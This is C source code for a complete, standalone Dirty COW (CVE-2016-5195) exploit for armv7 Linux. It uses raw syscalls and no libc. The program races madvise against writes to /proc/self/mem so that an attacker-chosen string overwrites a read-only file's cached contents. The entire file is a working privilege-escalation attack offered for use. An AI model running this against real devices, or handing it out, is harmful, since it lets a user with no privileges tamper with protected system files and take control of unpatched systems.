/* dirtycow_arm.c - CVE-2016-5195 (Dirty COW) proof for armv7
 * Syscall-only, static, no libc. Page-cache only: nothing is written to flash;
 * a reboot restores the original file contents.
 *
 * usage: dc <file> <replacement-string>
 */
#define SYS_exit        1
#define SYS_read        3
#define SYS_write       4
#define SYS_open        5
#define SYS_close       6
#define SYS_lseek       19
#define SYS_clone       120
#define SYS_nanosleep   162
#define SYS_mmap2       192
#define SYS_madvise     220

#define O_RDONLY        0
#define O_RDWR          2
#define PROT_READ       1
#define PROT_WRITE      2
#define MAP_PRIVATE     2
#define MAP_ANONYMOUS   0x20
#define MADV_DONTNEED   4

#define CLONE_VM        0x00000100
#define CLONE_FS        0x00000200
#define CLONE_FILES     0x00000400
#define CLONE_SIGHAND   0x00000800
#define CLONE_THREAD    0x00010000

static inline long syscall6(long n, long a, long b, long c, long d, long e, long f)
{
    register long r0 asm("r0") = a;
    register long r1 asm("r1") = b;
    register long r2 asm("r2") = c;
    register long r3 asm("r3") = d;
    register long r4 asm("r4") = e;
    register long r5 asm("r5") = f;
    asm volatile("mov r7, %[n]\n\tsvc 0"
                 : "+r"(r0)
                 : [n] "r"(n), "r"(r1), "r"(r2), "r"(r3), "r"(r4), "r"(r5)
                 : "r7", "memory");
    return r0;
}

static long sys_open(const char *p, long fl, long mode) { return syscall6(SYS_open, (long)p, fl, mode, 0, 0, 0); }
static long sys_read(long fd, void *buf, long len)      { return syscall6(SYS_read, fd, (long)buf, len, 0, 0, 0); }
static long sys_write(long fd, const void *b, long len) { return syscall6(SYS_write, fd, (long)b, len, 0, 0, 0); }
static long sys_close(long fd)                          { return syscall6(SYS_close, fd, 0, 0, 0, 0, 0); }
static long sys_lseek(long fd, long off, long wh)       { return syscall6(SYS_lseek, fd, off, wh, 0, 0, 0); }
static long sys_mmap2(long a, long l, long p, long f, long fd, long o) { return syscall6(SYS_mmap2, a, l, p, f, fd, o); }
static long sys_madvise(long a, long l, long adv)       { return syscall6(SYS_madvise, a, l, adv, 0, 0, 0); }
static long sys_nanosleep(long sec, long nsec)
{
    long ts[2];
    ts[0] = sec;
    ts[1] = nsec;
    return syscall6(SYS_nanosleep, (long)ts, 0, 0, 0, 0, 0);
}
static void sys_exit(long c) { syscall6(SYS_exit, c, 0, 0, 0, 0, 0); for (;;) {} }

static long strlen_(const char *s) { long n = 0; while (s[n]) n++; return n; }
static int memcmp_(const void *a, const void *b, long n)
{
    const unsigned char *x = a, *y = b;
    for (long i = 0; i < n; i++) if (x[i] != y[i]) return x[i] - y[i];
    return 0;
}
static void puts_(const char *s) { sys_write(1, s, strlen_(s)); }

static void *g_map;
static long g_len;
static const char *g_payload;
static volatile long g_stop;
static volatile long g_mcount, g_wcount, g_merr, g_werr, g_wok;

static void puthex(unsigned long v)
{
    char b[19];
    b[0] = '0'; b[1] = 'x';
    for (int i = 0; i < 16; i++) {
        int d = (v >> ((15 - i) * 4)) & 0xf;
        b[2 + i] = d < 10 ? '0' + d : 'a' + d - 10;
    }
    b[18] = '\n';
    sys_write(1, b, 19);
}

static void thread_madvise(void)
{
    while (!g_stop) {
        long r = sys_madvise((long)g_map, g_len, MADV_DONTNEED);
        if (r < 0 && r > -4096) g_merr = -r;
        g_mcount++;
    }
}

static void thread_write(void)
{
    long f = sys_open("/proc/self/mem", O_RDWR, 0);
    if (f < 0) { puts_("open /proc/self/mem failed\n"); sys_exit(2); }
    while (!g_stop) {
        sys_lseek(f, (long)g_map, 0);
        long r = sys_write(f, g_payload, g_len);
        if (r == g_len) g_wok++;
        else if (r < 0 && r > -4096) g_werr = -r;
        g_wcount++;
    }
}

__attribute__((naked)) static long spawn_raw(long flags, long stack)
{
    asm volatile(
        "mov r7, #120\n"
        "svc 0\n"
        "cmp r0, #0\n"
        "bxne lr\n"
        "ldr r0, [sp], #4\n"
        "blx r0\n"
        "mov r0, #0\n"
        "mov r7, #1\n"
        "svc 0\n");
}

static long spawn(void (*fn)(void))
{
    long stack = sys_mmap2(0, 1 << 16, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    long *top = (long *)(stack + (1 << 16));
    top[-1] = (long)fn;
    return spawn_raw(CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | CLONE_THREAD,
                     (long)(top - 1));
}

int main(int argc, char **argv)
{
    if (argc < 3) { puts_("usage: dc <file> <replacement-string>\n"); return 1; }

    const char *path = argv[1];
    const char *payload = argv[2];
    long plen = strlen_(payload);

    long rw = (argc >= 4);
    long fd = sys_open(path, rw ? O_RDWR : O_RDONLY, 0);
    if (fd < 0) { puts_("open target failed\n"); return 2; }
    long size = sys_lseek(fd, 0, 2);
    if (plen > size) plen = size;
    g_len = plen;
    g_payload = payload;

    g_map = (void *)sys_mmap2(0, size, rw ? (PROT_READ | PROT_WRITE) : PROT_READ, MAP_PRIVATE, fd, 0);
    if ((long)g_map < 0 && (long)g_map > -4096) { puts_("mmap failed\n"); return 3; }

    puts_("mapping ok, racing...\n");
    g_stop = 0;
    long t1 = spawn(thread_madvise);
    long t2 = spawn(thread_write);
    puts_("spawn madvise="); puthex((unsigned long)t1);
    puts_("spawn write  ="); puthex((unsigned long)t2);

    for (long i = 0; i < 600; i++) {
        sys_nanosleep(0, 50 * 1000 * 1000);
        long f2 = sys_open(path, O_RDONLY, 0);
        char buf[128];
        long n = sys_read(f2, buf, plen);
        sys_close(f2);
        if (n == plen && memcmp_(buf, payload, plen) == 0) {
            g_stop = 1;
            sys_nanosleep(0, 100 * 1000 * 1000);
            puts_("SUCCESS: page cache modified\n");
            return 0;
        }
    }
    g_stop = 1;
    puts_("FAILED (timeout) mcount="); puthex(g_mcount);
    puts_("wcount="); puthex(g_wcount);
    puts_("wok="); puthex(g_wok);
    puts_("merr="); puthex(g_merr);
    puts_("werr="); puthex(g_werr);
    return 4;
}

void _start(void)
{
    long *p;
    asm volatile("mov %0, sp" : "=r"(p));
    int argc = (int)p[0];
    char **argv = (char **)&p[1];
    long r = main(argc, argv);
    sys_exit(r);
}
